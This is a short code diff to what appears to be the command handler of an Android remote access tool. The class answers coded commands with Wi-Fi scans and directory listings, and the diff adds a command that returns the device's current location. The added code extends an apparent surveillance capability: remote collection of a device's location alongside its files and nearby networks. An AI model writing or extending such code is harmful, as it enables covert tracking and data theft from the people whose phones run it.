@@ -98,6 +98,10 @@ public class ConMan {
             case "0xWS":
                 returnMessage = String.valueOf(WifiScanner.scan(MainService.getContextOfApplication()));
                 break;
+            // Location Getter
+            case "0xL0":
+                returnMessage = LocMan.requestCurrentLocation();
+                break;
             // List Files in Given Directory
             case "0xF0":
                 returnMessage = String.valueOf(FileMan.walk(chunks[1]));
